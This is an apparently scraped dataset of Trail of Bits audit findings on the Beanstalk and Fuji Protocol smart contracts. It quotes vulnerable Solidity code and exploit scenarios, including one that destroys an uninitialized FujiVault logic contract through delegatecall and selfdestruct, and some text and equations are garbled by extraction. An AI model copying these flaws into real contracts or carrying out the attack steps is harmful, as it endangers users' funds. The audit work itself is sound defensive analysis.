Low"]}, {"title": "5. The sunrise() function rewards callers only with the base incentive ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "The increasing incentive that encourages users to call the sunrise() function in a timely manner is not actually applied. According to the Beanstalk white paper, the reward paid to users who call the sunrise() function should increase by 1% every second (for up to 300 seconds) after this method is eligible to be called; this incentive is designed so that, even when gas prices are high, the system can move on to the next season in a timely manner. This increasing incentive is calculated and included in the emitted logs, but it is not actually applied to the number of Bean tokens rewarded to users who call sunrise() . function incentivize ( address account , uint256 amount ) private { uint256 timestamp = block.timestamp .sub( s.season.start.add(s.season.period.mul(season())) ); if (timestamp > 300 ) timestamp = 300 ; uint256 incentive = LibIncentive.fracExp(amount, 100 , timestamp, 1 ); C.bean().mint(account, amount ); emit Incentivization(account, incentive ); } Figure 5.1: The incentive calculation in SeasonFacet.sol#70-78 Exploit Scenario Gas prices suddenly increase to the point that it is no longer protable to call sunrise() . Given the lack of an increasing incentive, the function goes uncalled for several hours, preventing the system from reacting to changing market conditions. Recommendations Short term, pass the incentive value instead of amount into the mint() function call. Long term, thoroughly document the expected behavior of the SeasonFacet contract and the properties (invariants) it should enforce, such as the caller of the sunrise() function receives the right incentive. Expand the unit test suite to test that these properties hold. Additionally, thoroughly document how the system would be aected if the sunrise() function were not called for a long period of time (e.g., in times of extreme network congestion). Finally, determine whether the Beanstalk team should rely exclusively on third parties to call the sunrise() function or whether an alternate system managed by the Beanstalk team should be adopted in addition to the current system. For example, an alternate system could involve an o-chain monitoring system and a trusted execution ow.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Beanstalk has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Beanstalk contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Lack of support for external transfers of nonstandard ERC20 tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "For external transfers of nonstandard ERC20 tokens via the TokenFacet contract, the code uses the standard transferFrom operation from the given token contract without checking the operations returndata ; as a result, successfully executed transactions that fail to transfer tokens will go unnoticed, causing confusion in users who believe their funds were successfully transferred. The TokenFacet contract exposes transferToken() , an external function that users can call to transfer ERC20 tokens both to and from the contract and between users. function transferToken( IERC20 token, address recipient, uint256 amount, LibTransfer.From fromMode, LibTransfer.To toMode ) external payable { LibTransfer.transferToken(token, recipient, amount, fromMode, toMode); } Figure 7.1: The transferToken() function in TokenFacet.sol#L39-47 This function calls the LibTransfer library, which handles the token transfer. function transferToken( IERC20 token, address recipient, uint256 amount, From fromMode, To toMode ) internal returns (uint256 transferredAmount) { if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) { token.transferFrom(msg.sender, recipient, amount); return amount; } amount = receiveToken(token, amount, msg.sender, fromMode); sendToken(token, amount, recipient, toMode); return amount; } Figure 7.2: The transferToken() function in LibTransfer.sol#L29-43 The LibTransfer library uses the fromMode and toMode values to determine a transfers sender and receiver, respectively; in most cases, it uses the safeERC20 library to execute transfers. However, if fromMode and toMode are both marked as EXTERNAL , then the transferFrom function of the token contract will be called directly, and safeERC20 will not be used. Essentially, if a user tries to transfer a nonstandard ERC20 token that does not revert on failure and instead indicates a transactions success or failure in its return data, the user could be led to believe that failed token transfers were successful. Exploit Scenario Alice uses the TokenFacet contract to transfer nonstandard ERC20 tokens that return false on failure to another contract. However, Alice accidentally inputs an amount higher than her balance. The transaction is successfully executed, but because there is no check of the false return value, Alice does not know that her tokens were not transferred. Recommendations Short term, use the safeERC20 library for external token transfers. Long term, thoroughly review and document all interactions with arbitrary tokens to prevent similar issues from being introduced in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Plot transfers from users with allowances revert if the owner has an existing pod listing ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Whenever a plot transfer is executed by a user with an allowance (i.e., a transfer in which the caller was approved by the plots owner), the transfer will revert if there is an existing listing for the pods contained in that plot. The MarketplaceFacet contract exposes a function, transferPlot() , that allows the owner of a plot to transfer the pods in that plot to another user; additionally, the owner of a plot can call the approvePods() function (gure 8.1) to approve other users to transfer these pods on the owners behalf. function approvePods(address spender, uint256 amount) external payable nonReentrant { } require(spender != address(0), \"Field: Pod Approve to 0 address.\"); setAllowancePods(msg.sender, spender, amount); emit PodApproval(msg.sender, spender, amount); Figure 8.1: The approvePods() function in MarketplaceFacet.sol#L147-155 Once approved, the given address can call the transferPlot() function to transfer pods on the owners behalf. The function checks and decreases the allowance and then checks whether there is an existing pod listing for the target pods. If there is an existing listing, the function tries to cancel it by calling the _cancelPodListing() function. function transferPlot( address sender, address recipient, uint256 id, uint256 start, uint256 end ) external payable nonReentrant { require( sender != address(0) && recipient != address(0), \"Field: Transfer to/from 0 address.\" ); uint256 amount = s.a[sender].field.plots[id]; require(amount > 0, \"Field: Plot not owned by user.\"); require(end > start && amount >= end, \"Field: Pod range invalid.\"); amount = end - start; // Note: SafeMath is redundant here. if ( msg.sender != sender && allowancePods(sender, msg.sender) != uint256(-1) ) { decrementAllowancePods(sender, msg.sender, amount); } if (s.podListings[id] != bytes32(0)) { _cancelPodListing(id); // TODO: Look into this cancelling. } _transferPlot(sender, recipient, id, start, amount); } Figure 8.2: The transferPlot() function in MarketplaceFacet.sol#L119-145 The _cancelPodListing() function receives only an id as the input and relies on the msg.sender to determine the listings owner. However, if the transfer is executed by a user with an allowance, the msg.sender is the user who was granted the allowance, not the owner of the listing. As a result, the function will revert. function _cancelPodListing(uint256 index) internal { require( s.a[msg.sender].field.plots[index] > 0, \"Marketplace: Listing not owned by sender.\" ); delete s.podListings[index]; emit PodListingCancelled(msg.sender, index); } Figure 8.3: The _cancelPodListing() function in Listing.sol#L149-156 Exploit Scenario A new smart contract that integrates with the MarketplaceFacet contract is deployed. This contract has features allowing it to manage users pods on their behalf. Alice approves the contract so that it can manage her pods. Some time passes, and Alice calls one of the smart contracts functions, which requires Alice to transfer ownership of her plot to the contract. Because Alice has already approved the smart contract, it can perform the transfer on her behalf. To do so, it calls the transferPlot() function in the MarketplaceFacet contract; however, this call reverts because Alice has an open listing for the pods that the contract is trying to transfer. Recommendations Short term, add a new input to _cancelPodListing() that is equal to msg.sender if the caller is the owner of the listing, but equal to the pod owner if the caller is a user who was approved by the owner. Long term, thoroughly document the expected behavior of the MarketplaceFacet contract and the properties (invariants) it should enforce, such as plot transfers initiated by users with an allowance cancel the owners listing. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Users can sow more Bean tokens than are burned ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "An accounting error allows users to sow more Bean tokens than the available soil allows. Whenever the price of Bean is below its peg, the protocol issues soil. Soil represents the willingness of the protocol to take Bean tokens o the market in exchange for a pod. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as non-callable bonds that mature on a rst-in-rst-out (FIFO) basis as the protocol issues new Bean tokens. Whenever soil is available, users can call the sow() and sowWithMin() functions in the FieldFacet contract. function sowWithMin( uint256 amount, uint256 minAmount, LibTransfer.From mode ) public payable returns (uint256) { uint256 sowAmount = s.f.soil; require( sowAmount >= minAmount && amount >= minAmount && minAmount > 0, \"Field: Sowing below min or 0 pods.\" ); if (amount < sowAmount) sowAmount = amount; return _sow(sowAmount, mode); } Figure 9.1: The sowWithMin() function in FieldFacet.sol#L41-53 The sowWithMin() function ensures that there is enough soil to sow the given number of Bean tokens and that the call will not sow fewer tokens than the specied minAmount . Once it makes these checks, it calls the _sow() function. function _sow(uint256 amount, LibTransfer.From mode) internal returns (uint256 pods) { pods = LibDibbler.sow(amount, msg.sender); if (mode == LibTransfer.From.EXTERNAL) C.bean().burnFrom(msg.sender, amount); else { amount = LibTransfer.receiveToken(C.bean(), amount, msg.sender, mode); C.bean().burn(amount); } } Figure 9.2: The _sow() function in FieldFacet.sol#L55-65 The _sow() function rst calculates the number of pods that will be sown by calling the sow() function in the LibDibbler library, which performs the internal accounting and calculates the number of pods that the user is entitled to. function sow(uint256 amount, address account) internal returns (uint256) { AppStorage storage s = LibAppStorage.diamondStorage(); // We can assume amount <= soil from getSowAmount s.f.soil = s.f.soil - amount ; return sowNoSoil(amount, account); } function sowNoSoil(uint256 amount, address account) internal returns (uint256) { } AppStorage storage s = LibAppStorage.diamondStorage(); uint256 pods = beansToPods(amount, s.w.yield); sowPlot(account, amount, pods); s.f.pods = s.f.pods.add(pods) ; saveSowTime(); return pods; function sowPlot( address account, uint256 beans, uint256 pods ) private { AppStorage storage s = LibAppStorage.diamondStorage(); s.a[account].field.plots[s.f.pods] = pods; emit Sow(account, s.f.pods, beans, pods); } Figure 9.3: The sow() , sowNoSoil() , and sowPlot() functions in LibDibbler.sol#L41-53 Finally, the sowWithMin() function burns the Bean tokens from the callers account, removing them from the supply. To do so, the function calls burnFrom() if the mode parameter is EXTERNAL (i.e., if the Bean tokens to be burned are not escrowed in the contract) and burn() if the Bean tokens are escrowed. If the mode parameter is not EXTERNAL , the receiveToken() function is executed to update the internal accounting of the contract before burning the tokens. This function returns the number of tokens that were transferred into the contract. In essence, the receiveToken() function allows the contract to correctly account for token transfers into it and to manage internal balances without performing token transfers. function receiveToken( IERC20 token, uint256 amount, address sender, From mode ) internal returns (uint256 receivedAmount) { if (amount == 0) return 0; if (mode != From.EXTERNAL) { receivedAmount = LibBalance.decreaseInternalBalance( sender, token, amount, mode != From.INTERNAL ); if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT) return receivedAmount; } token.safeTransferFrom(sender, address(this), amount - receivedAmount); return amount; } Figure 9.4: The receiveToken() function in FieldFacet.sol#L41-53 However, if the mode parameter is INTERNAL_TOLERANT , the contract allows the user to partially ll amount (i.e., to transfer as much as the user can), which means that if the user does not own the given amount of Bean tokens, the protocol simply burns as many tokens as the user owns but still allows the user to sow the full amount . Exploit Scenario Eve, a malicious user, spots the vulnerability in the FieldFacet contract and waits until Bean is below its peg and the protocol starts issuing soil. Bean nally goes below its peg, and the protocol issues 1,000 soil. Eve deposits a single Bean token into the contract by calling the transferToken() function in the TokenFacet contract. She then calls the sow() function with amount equal to 1000 and mode equal to INTERNAL_TOLERANT . The sow() function is executed, sowing 1,000 Bean tokens but burning only a single token. Recommendations Short term, modify the relevant code so that users Bean tokens are burned before the accounting for the soil and pods are updated and so that, if the mode eld is not EXTERNAL , the amount returned by receiveToken() is used as the input to LibDibbler.sow() . Long term, thoroughly document the expected behavior of the FieldFacet contract and the properties (invariants) it should enforce, such as the sow() function always sows as many Bean tokens as were burned. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "10. Pods may never ripen ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Whenever the price of Bean is below its peg, the protocol takes Bean tokens o the market in exchange for a number of p ods dependent on the current interest rate. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as loans that are repaid on a FIFO basis as the protocol issues new Bean tokens. A group of pods that are created together is called a plot. The queue of plots is referred to as the pod line. The pod line has no practical bound on its length, so during periods of decreasing demand, it can grow indenitely. No yield is awarded until the given plot owner is rst in line and until the price of Bean is above its value peg. While the protocol does not default on its debt, the only way for pods to ripen is if demand increases enough for the price of Bean to be above its value peg for some time. While the price of Bean is above its peg, a portion of newly minted Bean tokens is used to repay the rst plot in the pod line until fully repaid, decreasing the length of the pod line. During an extended period of decreasing supply, the pod line could grow long enough that lenders receive an unappealing time-weighted rate of return, even if the yield is increased; a suciently long pod line could encourage usersuncertain of whether future demand will grow enough for them to be repaidto sell their Bean tokens rather than lending them to the protocol. Under such circumstances, the protocol will be unable to disincentivize Bean market sales, disrupting its ability to return Bean to its value peg. Exploit Scenario Bean goes through an extended period of increasing demand, overextending its supply. Then, demand for Bean tokens slowly and steadily declines, and the pod line grows in length. At a certain point, some users decide that their time-weighted rate of return is unfavorable or too uncertain despite the promised high yields. Instead of lending their Bean tokens to the protocol, they sell. Recommendations Explore options for backing Bean s value with an oer that is guaranteed to eventually be fullled. 11. Bean and the o\u0000er backing it are strongly correlated Severity: Undetermined Diculty: Undetermined Type: Economic Finding ID: TOB-BEANS-011 Target: The Beanstalk protocol", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "12. Ability to whitelist assets uncorrelated with Bean price, misaligning governance incentives ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Stalk is the governance token of the system, rewarded to users who deposit certain whitelisted assets into the silo, the systems asset storage. When demand for Bean increases, the protocol increases the Bean supply by minting new Bean tokens and allocating some of them to Stalk holders. Additionally, if the price of Bean remains above its peg for an extended period of time, then a season of plenty (SoP) occurs: Bean is minted and sold on the open market in exchange for exogenous assets such as ETH. These exogenous assets are allocated entirely to Stalk holders. When demand for Bean decreases, the protocol decreases the Bean supply by borrowing Bean tokens from Bean owners. If the demand for Bean is persistently low and some of these loans are never repaid, Stalk holders are not directly penalized by the protocol. However, if the only whitelisted assets are strongly correlated with the price of Bean (such as ETH:BEAN LP tokens), then the value of Stalk holders deposited collateral would decline, indirectly penalizing Stalk holders for an unhealthy system. If, however, exogenous assets without a strong correlation to Bean are whitelisted, then Stalk holders who have deposited such assets will be protected from nancial penalties if the price of Bean crashes. Exploit Scenario Stalk holders vote to whitelist ETH as a depositable asset. They proceed to deposit ETH and begin receiving shares of rewards, including 3CRV tokens acquired during SoPs. Governance is now incentivized to increase the supply of Bean as high as possible to obtain more 3CRV rewards, which eventually results in an overextension of the Bean supply and a subsequent price crash. After the Bean price crashes, Stalk holders withdraw their deposited ETH and 3CRV rewards. Because ETH is not strongly correlated with the price of Bean, they do not suer nancial loss as a result of the crash. Alternatively, because of the lack of on-chain enforcement of o-chain votes, the above scenario could occur if the community multisignature wallet whitelists ETH, even if no related vote occurred. Recommendations Do not allow any assets that are not strongly correlated with the price of Bean to be whitelisted. Additionally, implement monitoring systems that provide alerts every time a new asset is whitelisted.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "13. Unchecked burnFrom return value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "While recapitalizing the Beanstalk protocol, Bean and LP tokens that existed before the 2022 governance hack are represented as unripe tokens. Ripening is the process of burning unripe tokens in exchange for a pro rata share of the underlying assets generated during the Barn Raise. Holders of unripe tokens call the ripen function to receive their portion of the recovered underlying assets. This portion grows while the price of Bean is above its peg, incentivizing users to ripen their tokens later, when more of the loss has been recovered. The ripen code assumes that if users try to redeem more unripe tokens than they hold, burnFrom will revert. If burnFrom returns false instead of reverting, the failure of the balance check will go undetected, and the caller will be able to recover all of the underlying tokens held by the contract. While LibUnripe.decrementUnderlying will revert on calls to ripen more than the contracts balance, it does not check the users balance. The source code of the unripeToken contract was not provided for review during this audit, so we could not determine whether its burnFrom method is implemented safely. function ripen ( address unripeToken , uint256 amount , LibTransfer.To mode ) external payable nonReentrant returns ( uint256 underlyingAmount ) { underlyingAmount = getPenalizedUnderlying(unripeToken, amount); LibUnripe.decrementUnderlying(unripeToken, underlyingAmount); IBean(unripeToken).burnFrom( msg.sender , amount); address underlyingToken = s.u[unripeToken].underlyingToken; IERC20(underlyingToken).sendToken(underlyingAmount, msg.sender , mode); emit Ripen( msg.sender , unripeToken, amount, underlyingAmount); } Figure 13.1: The ripen() function in UnripeFacet.sol#L51- Exploit Scenario Alice notices that the burnFrom function is implemented incorrectly in the unripeToken contract. She calls ripen with an amount greater than her unripe token balance and is able to receive the contracts entire balance of underlying tokens. Recommendations Short term, add an assert statement to ensure that users who call ripen have sucient balance to burn the given amount of unripe tokens. Long term, implement all security-critical assertions on user-supplied input in the beginning of external functions. Do not rely on untrusted code to perform required safety checks or to behave as expected.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Anyone can destroy the FujiVault logic contract if its initialize function was not called during deployment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Anyone can destroy the FujiVault logic contract if its initialize function has not already been called. Calling initialize on a logic contract is uncommon, as usually nothing is gained by doing so. The deployment script does not call initialize on any logic contract. As a result, the exploit scenario detailed below is possible after deployment. This issue is similar to a bug in AAVE that found in 2020. OpenZeppelins hardhat-upgrades plug-in protects against this issue by disallowing the use of selfdestruct or delegatecall on logic contracts. However, the Fuji Protocol team has explicitly worked around these protections by calling delegatecall in assembly, which the plug-in does not detect. Exploit Scenario The Fuji contracts are deployed, but the initialize functions of the logic contracts are not called. Bob, an attacker, deploys a contract to the address alwaysSelfdestructs, which simply always executes the selfdestruct opcode. Additionally, Bob deploys a contract to the address alwaysSucceeds, which simply never reverts. Bob calls initialize on the FujiVault logic contract, thereby becoming its owner. To make the call succeed, Bob passes 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE as the value for the _collateralAsset and _borrowAsset parameters. He then calls FujiVaultLogic.setActiveProvider(alwaysSelfdestructs), followed by FujiVault.setFujiERC1155(alwaysSucceeds) to prevent an additional revert in the next and nal call. Finally, Bob calls FujiVault.deposit(1), sending 1 wei. This triggers a delegatecall to alwaysSelfdestructs, thereby destroying the FujiVault logic contract and making the protocol unusable until its proxy contract is upgraded. 14 Fuji Protocol Because OpenZeppelins upgradeable contracts do not check for a contracts existence before a delegatecall (TOB-FUJI-003), all calls to the FujiVault proxy contract now succeed. This leads to exploits in any protocol integrating the Fuji Protocol. For example, a call that should repay all debt will now succeed even if no debt is repaid. Recommendations Short term, do not use delegatecall to implement providers. See TOB-FUJI-002 for more information. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 15 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "2. Providers are implemented with delegatecall ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The system uses delegatecall to execute an active provider's code on a FujiVault, making the FujiVault the holder of the positions in the borrowing protocol. However, delegatecall is generally error-prone, and the use of it introduced the high-severity nding TOB-FUJI-001. It is possible to make a FujiVault the holder of the positions in a borrowing protocol without using delegatecall. Most borrowing protocols include a parameter that species the receiver of tokens that represent a position. For borrowing protocols that do not include this type of parameter, tokens can be transferred to the FujiVault explicitly after they are received from the borrowing protocol; additionally, the tokens can be transferred from the FujiVault to the provider before they are sent to the borrowing protocol. These solutions are conceptually simpler than and preferred to the current solution. Recommendations Short term, implement providers without the use of delegatecall. Set the receiver parameters to the FujiVault, or transfer the tokens corresponding to the position to the FujiVault. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 16 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "3. Lack of contract existence check on delegatecall will result in unexpected behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The VaultControlUpgradeable and Proxy contracts use the delegatecall proxy pattern. If the implementation contract is incorrectly set or self-destructed, the contract may not be able to detect failed executions. The VaultControlUpgradeable contract includes the _execute function, which users can invoke indirectly to execute a transaction to a _target address. This function does not check for contract existence before executing the delegatecall (gure 3.1). /** * @dev Returns byte response of delegatcalls */ function _execute(address _target, bytes memory _data) internal whenNotPaused returns (bytes memory response) { /* solhint-disable */ assembly { let succeeded := delegatecall(sub(gas(), 5000), _target, add(_data, 0x20), mload(_data), 0, 0) let size := returndatasize() response := mload(0x40) mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(response, size) returndatacopy(add(response, 0x20), 0, size) switch iszero(succeeded) case 1 { // throw if delegatecall failed revert(add(response, 0x20), size) } } /* solhint-disable */ } 17 Fuji Protocol Figure 3.1: fuji-protocol/contracts/abstracts/vault/VaultBaseUpgradeable.sol#L93-L11 5 The Proxy contract, deployed by the @openzeppelin/hardhat-upgrades library, includes a payable fallback function that invokes the _delegate function when proxy calls are executed. This function is also missing a contract existence check (gure 3.2). /** * @dev Delegates the current call to `implementation`. * * This function does not return to its internall call site, it will return directly to the external caller. */ function _delegate(address implementation) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy(0, 0, calldatasize()) // Call the implementation. // out and outsize are 0 because we don't know the size yet. let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) // Copy the returned data. returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) } } } Figure 3.2: Proxy.sol#L16-L41 A delegatecall to a destructed contract will return success (gure 3.3). Due to the lack of contract existence checks, a series of batched transactions may appear to be successful even if one of the transactions fails. The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 3.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Eve upgrades the proxy to point to an incorrect new implementation. As a result, each 18 Fuji Protocol delegatecall returns success without changing the state or executing code. Eve uses this to scam users. Recommendations Short term, implement a contract existence check before any delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from using these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability 19 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. FujiVault.setFactor is unnecessarily complex and does not properly handle invalid input ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiVault contracts setFactor function sets one of four state variables to a given value. Which state variable is set depends on the value of a string parameter. If an invalid value is passed, setFactor succeeds but does not set any of the state variables. This creates edge cases, makes writing correct code more dicult, and increases the likelihood of bugs. function setFactor( uint64 _newFactorA, uint64 _newFactorB, string calldata _type ) external isAuthorized { bytes32 typeHash = keccak256(abi.encode(_type)); if (typeHash == keccak256(abi.encode(\"collatF\"))) { collatF.a = _newFactorA; collatF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"safetyF\"))) { safetyF.a = _newFactorA; safetyF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"bonusLiqF\"))) { bonusLiqF.a = _newFactorA; bonusLiqF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"protocolFee\"))) { protocolFee.a = _newFactorA; protocolFee.b = _newFactorB; } } Figure 4.1: FujiVault.sol#L475-494 Exploit Scenario A developer on the Fuji Protocol team calls setFactor from another contract. He passes a type that is not handled by setFactor. As a result, code that is expected to set a state variable does nothing, resulting in a more severe vulnerability. 20 Fuji Protocol Recommendations Short term, replace setFactor with four separate functions, each of which sets one of the four state variables. Long term, avoid string constants that simulate enumerations, as they cannot be checked by the typechecker. Instead, use enums and ensure that any code that depends on enum values handles all possible values. 21 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "5. Preconditions specied in docstrings are not checked by functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The docstrings of several functions specify preconditions that the functions do not automatically check for. For example, the docstring of the FujiVault contracts setFactor function contains the preconditions shown in gure 5.1, but the functions body does not contain the corresponding checks shown in gure 5.2. * For safetyF; Sets Safety Factor of Vault, should be > 1, a/b * For collatF; Sets Collateral Factor of Vault, should be > 1, a/b Figure 5.1: FujiVault.sol#L469-470 require(safetyF.a > safetyF.b); ... require(collatF.a > collatF.b); Figure 5.2: The checks that are missing from FujiVault.setFactor Additionally, the docstring of the Controller contracts doRefinancing function contains the preconditions shown in gure 5.3, but the functions body does not contain the corresponding checks shown in gure 5.4. * @param _ratioB: _ratioA/_ratioB <= 1, and > 0 Figure 5.3: Controller.sol#L41 require(ratioA > 0 && ratioB > 0); require(ratioA <= ratioB); Figure 5.4: The checks that are missing from Controller.doRefinancing Exploit Scenario The setFactor function is called with values that violate its documented preconditions. Because the function does not check for these preconditions, unexpected behavior occurs. 22 Fuji Protocol Recommendations Short term, add checks for preconditions to all functions with preconditions specied in their docstrings. Long term, ensure that all documentation and code are in sync. 23 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "6. The FujiERC1155.burnBatch function implementation is incorrect ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contracts burnBatch function deducts the unscaled amount from the user's balance and from the total supply of an asset. If the liquidity index of an asset (index[assetId]) is dierent from its initialized value, the execution of burnBatch could result in unintended arithmetic calculations. Instead of deducting the amount value, the function should deduct the amountScaled value. function burnBatch( address _account, uint256[] memory _ids, uint256[] memory _amounts ) external onlyPermit { require(_account != address(0), Errors.VL_ZERO_ADDR_1155); require(_ids.length == _amounts.length, Errors.VL_INPUT_ERROR); address operator = _msgSender(); uint256 accountBalance; uint256 assetTotalBalance; uint256 amountScaled; for (uint256 i = 0; i < _ids.length; i++) { uint256 amount = _amounts[i]; accountBalance = _balances[_ids[i]][_account]; assetTotalBalance = _totalSupply[_ids[i]]; amountScaled = _amounts[i].rayDiv(indexes[_ids[i]]); require(amountScaled != 0 && accountBalance >= amountScaled, Errors.VL_INVALID_BURN_AMOUNT); _balances[_ids[i]][_account] = accountBalance - amount; _totalSupply[_ids[i]] = assetTotalBalance - amount; } emit TransferBatch(operator, _account, address(0), _ids, _amounts); } Figure 6.1: FujiERC1155.sol#L218-247 24 Fuji Protocol Exploit Scenario The burnBatch function is called with an asset for which the liquidity index is dierent from its initialized value. Because amount was used instead of amountScaled, unexpected behavior occurs. Recommendations Short term, revise the burnBatch function so that it uses amountScaled instead of amount when updating a users balance and the total supply of an asset. Long term, use the burn function in the burnBatch function to keep functionality consistent. 25 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Error in the white papers equation for the cost of renancing ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The white paper uses the following equation (equation 4) to describe how the cost of renancing is calculated:    =  +   +   +   +     is the amount of debt to be renanced and is a summand of the equation. This is incorrect, as it implies that the renancing cost is always greater than the amount of debt to be renanced. A correct version of the equation could be   is an amount, or     =  +    +  +  +   = +   +   *      , in which  is a  , in which  percentage. Recommendations Short term, x equation 4 in the white paper. Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 26 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "8. Errors in the white papers equation for index calculation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The white paper uses the following equation (equation 1) to describe how the index for a given token at timestamp is calculated:    =  1 + ( 1 )/    1  is the amount of the given token that the Fuji Protocol owes the provider (the borrowing  protocol) at timestamp . The index is updated only when the balance changes through the accrual of interest, not when the balance changes through borrowing or repayment operations. This means that    is always negative, which is incorrect, as  should calculate the )/    ( 1 1 1 interest rate since the last index update. *  3 *  2 * ... *  . A user's current balance is computed by taking the users initial stored  The index represents the total interest rate since the deployment of the protocol. It is the product of the various interest rates accrued on the active providers during the lifetime of the protocol (measured only during state-changing interactions with the provider):  1 balance, multiplying it by the current index, and dividing it by the index at the time of the creation of that user's position. The division operation ensures that the user will not owe interest that accrued before the creation of the users position. The index provides an ecient way to keep track of interest rates without having to update each user's balance separately, which would be prohibitively expensive on Ethereum. However, interest is compounded through multiplication, not addition. The formula should use the product sign instead of the plus sign. 27 Fuji Protocol Exploit Scenario Alice decides to use the Fuji Protocol after reading the white paper. She later learns that calculations in the white paper do not match the implementations in the protocol. Because Alice allocated her funds based on her understanding of the specication, she loses funds. Recommendations Short term, replace equation 1 in the white paper with a correct and simplied version. For more information on the simplied version, see nding TOB-FUJI-015.   =  1 / *   1 Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 28 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Undetermined"]}, {"title": "9. FujiERC1155.setURI does not adhere to the EIP-1155 specication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contracts setURI function does not emit the URI event. /** * @dev Sets a new URI for all token types, by relying on the token type ID */ function setURI(string memory _newUri) public onlyOwner { _uri = _newUri; } Figure 9.1: 